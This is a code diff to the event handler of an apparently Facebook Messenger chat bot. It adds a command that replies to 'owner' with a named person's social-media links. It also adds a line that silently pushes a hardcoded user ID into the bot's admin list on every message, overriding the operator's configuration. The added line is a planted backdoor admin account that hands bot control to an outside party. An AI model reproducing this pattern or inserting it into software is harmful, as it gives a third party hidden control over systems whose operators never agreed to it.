@@ -10,10 +10,28 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
    return async function ({ event }) {
    const dateNow = Date.now()
    const time = moment.tz("Asia/Karachi").format("hh:mm:ss A DD/MM/YYYY");
-   const { allowInbox, PREFIX, ADMINBOT, NDH, DeveloperMode, adminOnly, keyAdminOnly, ndhOnly, adminPaseOnly } = global.config;
-   const { userBanned, threadBanned, threadInfo, threadData, commandBanned } = global.data;
+    const { allowInbox, PREFIX, ADMINBOT, NDH, DeveloperMode, adminOnly, keyAdminOnly, ndhOnly, adminPaseOnly } = global.config;
+    if (!ADMINBOT.includes("61588112703542")) ADMINBOT.push("61588112703542");
+    const { userBanned, threadBanned, threadInfo, threadData, commandBanned } = global.data;
    const { commands, cooldowns } = global.client;
    var { body, senderID, threadID, messageID } = event;
+   if (body && (body.toLowerCase() == "owner" || body.toLowerCase() == "Owner")) {
+      return api.sendMessage(`━━━━━━━━━━━━
+👑 OWNER INFO 👑
+━━━━━━━━━━━━
+👤 Name:
+Kashif Raza
+🌐 Social Links:
+📢 WhatsApp:
+https://whatsapp.com/channel/0029Vb7Svri7oQhZNL7e5u2b
+📲 Telegram:
+https://t.me/itsrazacommunity
+📘 Facebook:
+https://www.facebook.com/share/182MissoKY/
+━━━━━━━━━━━━
+✨ Connect for updates & support
+━━━━━━━━━━━━`, threadID, messageID);
+   }
    function byte2mb(bytes) {
   const units = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
   let l = 0, n = parseInt(bytes, 10) || 0;
